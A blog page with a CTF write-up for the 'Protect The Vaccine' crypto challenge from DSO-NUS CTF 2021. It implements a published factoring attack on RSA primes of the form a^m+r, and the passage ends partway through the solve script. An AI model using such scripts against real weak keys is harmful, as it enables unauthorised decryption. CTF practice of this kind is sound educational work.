<!DOCTYPE html>
<html lang="en-US" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>DSO-NUS CTF 2021 writeups | N00bcak's Purple Cave</title>
    <meta name="description" content="Blogging Things When I Feel Like It">
    <meta name="generator" content="VitePress v2.0.0-alpha.15">
    <link rel="preload stylesheet" href="/assets/style.J3FZYP_c.css" as="style">
    <link rel="preload stylesheet" href="/vp-icons.css" as="style">
    
    <script type="module" src="/assets/app._rTD6Zcy.js"></script>
    <link rel="preload" href="/assets/inter-roman-latin.Di8DUHzh.woff2" as="font" type="font/woff2" crossorigin="">
    <link rel="modulepreload" href="/assets/chunks/theme.Bwe-6f2d.js">
    <link rel="modulepreload" href="/assets/chunks/framework.DsG8PLbD.js">
    <link rel="modulepreload" href="/assets/writeups_2021-03-02-DSO-NUS-ctf.md.Ct7M1uPH.lean.js">
    <script id="check-dark-mode">(()=>{const e=localStorage.getItem("vitepress-theme-appearance")||"auto",a=window.matchMedia("(prefers-color-scheme: dark)").matches;(!e||e==="auto"?a:e==="dark")&&document.documentElement.classList.add("dark")})();</script>
    <script id="check-mac-os">document.documentElement.classList.toggle("mac",/Mac|iPhone|iPod|iPad/i.test(navigator.platform));</script>
  </head>
  <body>
    <div id="app"><div class="Layout" data-v-1df9f90f><!--[--><!--]--><!--[--><span tabindex="-1" data-v-331ec75c></span><a href="#VPContent" class="VPSkipLink visually-hidden" data-v-331ec75c>Skip to content</a><!--]--><!----><header class="VPNav" data-v-1df9f90f data-v-da52a441><div class="VPNavBar" data-v-da52a441 data-v-70946a35><div class="wrapper" data-v-70946a35><div class="container" data-v-70946a35><div class="title" data-v-70946a35><div class="VPNavBarTitle" data-v-70946a35 data-v-1e38c6bc><a class="title" href="/" data-v-1e38c6bc><!--[--><!--]--><!----><span data-v-1e38c6bc>N00bcak&#39;s Purple Cave</span><!--[--><!--]--></a></div></div><div class="content" data-v-70946a35><div class="content-body" data-v-70946a35><!--[--><!--]--><div class="VPNavBarSearch search" data-v-70946a35><!----></div><nav aria-labelledby="main-nav-aria-label" class="VPNavBarMenu menu" data-v-70946a35 data-v-39714824><span id="main-nav-aria-label" class="visually-hidden" data-v-39714824> Main Navigation </span><!--[--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/" tabindex="0" data-v-39714824 data-v-52a1d768><!--[--><span data-v-52a1d768>Home</span><!--]--></a><!--]--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/about-me.html" tabindex="0" data-v-39714824 data-v-52a1d768><!--[--><span data-v-52a1d768>About</span><!--]--></a><!--]--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/writeups.html" tabindex="0" data-v-39714824 data-v-52a1d768><!--[--><span data-v-52a1d768>CTF Writeups</span><!--]--></a><!--]--><!--[--><a class="VPLink link VPNavBarMenuLink" href="/blog.html" tabindex="0" data-v-39714824 data-v-52a1d768><!--[--><span data-v-52a1d768>Blog</span><!--]--></a><!--]--><!--]--></nav><!----><div class="VPNavBarAppearance appearance" data-v-70946a35 data-v-6c893767><button class="VPSwitch VPSwitchAppearance" type="button" role="switch" title aria-checked="false" data-v-6c893767 data-v-5337faa4 data-v-1d5665e3><span class="check" data-v-1d5665e3><span class="icon" data-v-1d5665e3><!--[--><span class="vpi-sun sun" data-v-5337faa4></span><span class="vpi-moon moon" data-v-5337faa4></span><!--]--></span></span></button></div><div class="VPSocialLinks VPNavBarSocialLinks social-links" data-v-70946a35 data-v-0394ad82 data-v-d07f11e6><!--[--><a class="VPSocialLink no-icon" href="https://github.com/N00bcak" aria-label="github" target="_blank" rel="me noopener" data-v-d07f11e6 data-v-591a6b30><span class="vpi-social-github"></span></a><!--]--></div><div class="VPFlyout VPNavBarExtra extra" data-v-70946a35 data-v-bf2fac68 data-v-42cb505d><button type="button" class="button" aria-haspopup="true" aria-expanded="false" aria-label="extra navigation" data-v-42cb505d><span class="vpi-more-horizontal icon" data-v-42cb505d></span></button><div class="menu" data-v-42cb505d><div class="VPMenu" data-v-42cb505d data-v-25a6cce8><!----><!--[--><!--[--><!----><div class="group" data-v-bf2fac68><div class="item appearance" data-v-bf2fac68><p class="label" data-v-bf2fac68>Appearance</p><div class="appearance-action" data-v-bf2fac68><button class="VPSwitch VPSwitchAppearance" type="button" role="switch" title aria-checked="false" data-v-bf2fac68 data-v-5337faa4 data-v-1d5665e3><span class="check" data-v-1d5665e3><span class="icon" data-v-1d5665e3><!--[--><span class="vpi-sun sun" data-v-5337faa4></span><span class="vpi-moon moon" data-v-5337faa4></span><!--]--></span></span></button></div></div></div><div class="group" data-v-bf2fac68><div class="item social-links" data-v-bf2fac68><div class="VPSocialLinks social-links-list" data-v-bf2fac68 data-v-d07f11e6><!--[--><a class="VPSocialLink no-icon" href="https://github.com/N00bcak" aria-label="github" target="_blank" rel="me noopener" data-v-d07f11e6 data-v-591a6b30><span class="vpi-social-github"></span></a><!--]--></div></div></div><!--]--><!--]--></div></div></div><!--[--><!--]--><button type="button" class="VPNavBarHamburger hamburger" aria-label="mobile navigation" aria-expanded="false" aria-controls="VPNavScreen" data-v-70946a35 data-v-e5dd9c1c><span class="container" data-v-e5dd9c1c><span class="top" data-v-e5dd9c1c></span><span class="middle" data-v-e5dd9c1c></span><span class="bottom" data-v-e5dd9c1c></span></span></button></div></div></div></div><div class="divider" data-v-70946a35><div class="divider-line" data-v-70946a35></div></div></div><!----></header><div class="VPLocalNav empty fixed" data-v-1df9f90f data-v-db738f89><div class="container" data-v-db738f89><!----><div class="VPLocalNavOutlineDropdown" style="--vp-vh:0px;" data-v-db738f89 data-v-0bf0e06f><button data-v-0bf0e06f>Return to top</button><!----></div></div></div><!----><div class="VPContent" id="VPContent" data-v-1df9f90f data-v-c87f25bf><div class="VPDoc has-aside" data-v-c87f25bf data-v-7011f0d8><!--[--><!--]--><div class="container" data-v-7011f0d8><div class="aside" data-v-7011f0d8><div class="aside-curtain" data-v-7011f0d8></div><div class="aside-container" data-v-7011f0d8><div class="aside-content" data-v-7011f0d8><div class="VPDocAside" data-v-7011f0d8 data-v-3f215769><!--[--><!--]--><!--[--><!--]--><nav aria-labelledby="doc-outline-aria-label" class="VPDocAsideOutline" data-v-3f215769 data-v-60d5052e><div class="content" data-v-60d5052e><div class="outline-marker" data-v-60d5052e></div><div aria-level="2" class="outline-title" id="doc-outline-aria-label" role="heading" data-v-60d5052e>On this page</div><ul class="VPDocOutlineItem root" data-v-60d5052e data-v-1ce71065><!--[--><!--]--></ul></div></nav><!--[--><!--]--><div class="spacer" data-v-3f215769></div><!--[--><!--]--><!----><!--[--><!--]--><!--[--><!--]--></div></div></div></div><div class="content" data-v-7011f0d8><div class="content-container" data-v-7011f0d8><!--[--><!--[--><!--[--><h1 id="title">DSO-NUS CTF 2021 writeups</h1><!--]--><!--]--><!--]--><main class="main" data-v-7011f0d8><div style="position:relative;" class="vp-doc _writeups_2021-03-02-DSO-NUS-ctf" data-v-7011f0d8><div><p>The DSO-NUS CTF was my first local competition of 2021 :).</p><p>I had honestly expected that I would not solve any challenges, seeing as to how this CTF was also targeted at <strong>University</strong> students rather than the <strong>Junior College/ITE</strong> categories that I was so used to.</p><p>However, my teammate and I managed to pull through and clinch 10th place!</p><p><img src="/assets/results.C4_qcfi9.png" alt="" data-zoomable="true"><img src="/assets/solves.YtecrPp4.png" alt="" data-zoomable="true"></p><h1 id="writeups" tabindex="-1">Writeups <a class="header-anchor" href="#writeups" aria-label="Permalink to “Writeups”">​</a></h1><p>Also, I made writeups the following challenges:</p><ol><li><a href="#protect-the-vaccine">(Crypto) Protect The Vaccine</a></li><li><a href="#login">(Mobile) Login</a></li><li><a href="#robust-orbital-postal-service">(Pwn) Robust Orbital Postal Service</a></li></ol><h2 id="protect-the-vaccine" tabindex="-1">Protect The Vaccine <a class="header-anchor" href="#protect-the-vaccine" aria-label="Permalink to “Protect The Vaccine”">​</a></h2><p><code>A nation-supported hacker group is using their cutting edge technology to attack a company that develops vaccine. They roll their own crypto with a hope that it will be more secure. Luckily, we have got some of their crypto system information and also have found some research that is likely to break their crypto system. I heard you are a cipher breaker, could you help us to decrypt their secret and protect the vaccine from their plan?</code></p><h3 id="reconnaissance" tabindex="-1">Reconnaissance <a class="header-anchor" href="#reconnaissance" aria-label="Permalink to “Reconnaissance”">​</a></h3><p>We are given the 2020 paper by Amir Hamzah, Mhd. Rezal, and Mhd. Azraf, <a href="https://www.mdpi.com/2073-8994/12/5/838" target="_blank" rel="noreferrer">A New LSB Attack on Special-Structured RSA Primes</a>, and an encryptor file as below:</p><div class="language-python line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki shiki-themes github-light dracula" style="--shiki-light:#24292e;--shiki-dark:#F8F8F2;--shiki-light-bg:#fff;--shiki-dark-bg:#282A36;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> config </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> a,b,m,r_p,r_q,secret</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> Crypto.Util.number </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> bytes_to_long</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">p </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> a</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">**</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">m </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> r_p</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">q </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> b</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">**</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">m </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> r_q</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">N </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> p</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">q</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">e </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;"> 65537</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">M </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> bytes_to_long(secret)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">c </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;"> pow</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(M, e, N)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">N:</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">, N)</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">e:</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">, e)</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">r_p:</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">, r_p)</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">r_q:</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">, r_q)</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">c:</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">, c)</span></span></code></pre><div class="line-numbers-wrapper" aria-hidden="true"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>The paper itself describes an attack on <strong>primes of the special form <img src="https://render.githubusercontent.com/render/math?math=$n%5E%7Bm%7D%2Br$" alt="" data-zoomable="true"></strong>, where <code>n,m,r</code> are secret integers.</p><p>Ostensibly this is of the same form as the primes p and q in this challenge.</p><p><strong>At this point I heaved a protracted sigh of disappointment, deflating and slouching upon my chair as a leaky balloon prostrates upon the floor.</strong></p><p><strong>If Uncle Roger were here he would put down his leg. H A I Y A A.</strong></p><h3 id="on-the-challenge-itself" tabindex="-1">On The Challenge Itself <a class="header-anchor" href="#on-the-challenge-itself" aria-label="Permalink to “On The Challenge Itself”">​</a></h3><p>It should be painfully obvious that whoever made this challenge simply wanted us to implement the attack.</p><p>The proofs and conceptual framework are thus insignificant. It is a nice paper though.</p><p>Below is a brief explanation of the attack:</p><ol><li>Compute $$i=\lceil r_{p}r_{q} \rceil$$.</li><li>Thus compute $$\sigma=(\lceil \sqrt{N}\rceil-i)^{2}$$ and $$z\equiv N-(r_{p}r_{q})\pmod\sigma$$.</li><li>Then solve the quadratic equation $$X^{2}-zX+\sigma r_{p}r_{q}=0$$.</li><li>So compute $$p=\frac{x_{1}}{r_{q}}+r_{p}$$, and $$q=\frac{x_{1}}{r_{p}}+r_{q}$$.</li><li>If you do not get integer solutions for <code>p</code> and <code>q</code>, increment <code>i</code> and go to step 2.</li><li>Otherwise, you have factorized <code>p</code> and <code>q</code>.</li></ol><p>There really is no need to explain anything else. Let&#39;s claim our flag and walk away in dejection...</p><h3 id="the-script-the-flag" tabindex="-1">The Script &amp; The Flag <a class="header-anchor" href="#the-script-the-flag" aria-label="Permalink to “The Script &amp; The Flag”">​</a></h3><div class="language-python line-numbers-mode"><button title="Copy Code" class="copy"></button><span class="lang">python</span><pre class="shiki shiki-themes github-light dracula" style="--shiki-light:#24292e;--shiki-dark:#F8F8F2;--shiki-light-bg:#fff;--shiki-dark-bg:#282A36;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> Crypto.Util.number </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">import</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> long_to_bytes</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">N</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">3275733051034358984052873301763419226982953208866734590577442123100212241755791923555521543209801099055699081707325573295107810120279016450478569963727745375599027892100123044479660797401966572267597729137245240398252709789403914717981992805267568330238483858915840720285089128695716116366797390222336632152162599116524881401005018469215424916742801818134711336300828503706379381178900753467864554260446708842162773345348298157467411926079756092147544497068000233007477191578333572784654318537785544709699328915760518608291118807464400785836835778315009377442766842129158923286952014836265426233094717963075689446543</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">e</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">65537</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r_p</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">5555</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r_q</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">2021</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">c</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">1556192154031991594732510705883546583096229743096303430901374706824505750761088363281890335979653013911714293502545423757924361475736093242401222947901355869932133190452403616496603786871994754637823336368216836022953863014593342644392369877974990401809731572974216127814977558172171864993498081681595043521251475276813852699339208084848504200274031750249400405999547189108618939914820295837292164648879085448065561197691023430722069818332742153760012768834458654303088057879612122947985115227503445210002797443447539212535515235045439442675101339926607807561016634838677881127459579466831387538801957970278441177712</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># I believe all you need to do is follow the instructions...</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">i</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">ceil(sqrt(r_p</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r_q))</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">factorized</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">False</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">while</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;"> not</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> factorized:</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    sigma</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#005CC5;--shiki-light-font-style:inherit;--shiki-dark:#8BE9FD;--shiki-dark-font-style:italic;">int</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(sqrt(N))</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">i)</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">**</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">2</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    z</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-light-font-style:inherit;--shiki-dark:#8BE9FD;--shiki-dark-font-style:italic;">int</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(Mod(N</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r_p</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r_q,sigma))</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">    print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(i)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    x</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">var(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">x</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    S </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> solve(x</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">^</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">2</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">z</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">x</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">sigma</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r_p</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r_q</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">==</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">,x,</span><span style="--shiki-light:#E36209;--shiki-light-font-style:inherit;--shiki-dark:#FFB86C;--shiki-dark-font-style:italic;">solution_dict</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">True</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">    for</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> soln </span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">in</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> S:</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">        if</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;"> not</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;"> soln[x].is_integer():</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">            print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">No solution :(((</span><span style="--shiki-light:#032F62;--shiki-dark:#E9F284;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">            break</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">        else</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">:</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">            print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">f</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">&quot;Got Solution! </span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">{</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">soln[x]</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">}</span><span style="--shiki-light:#032F62;--shiki-dark:#F1FA8C;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">            factorized</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">True</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">    i</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+=</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">1</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6272A4;"># Turns out we got lucky. At i=3379 we receive</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">x1</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">168200524686562144694620288802920098491216735170837810125672320002939647866974222365012727452940769281308849288903115688589419797624616813460735137583543839726240553545302460214475263890124428240711467804365871217554755973866852861234743770756153485545678683848833029401921482153203747584834969282377159947080780</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">x2</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">218640963841168131005470550035379468161157139960153907690360606758392731649074205802111908622011434335143690091387592220823296028451227124397192393817824166806698902839833001318765091590325160563899341911850960055105827530299680127408632836041078255714159019688574965424438294715765508204336190307241026142672404</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">q</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(x1</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r_p)</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r_q</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">p</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(x2</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r_q)</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">+</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">r_p</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#8BE9FD;">print</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(p</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">q</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">==</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">N)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">totient</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(p</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">-</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">*</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">(q</span><span style="--shiki-light:#D73A49;--shiki-dark:#FF79C6;">-</span><span style="--shiki-light:#005CC5;--shiki-dark:#BD93F9;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#F8F8F2;">)</span></span>
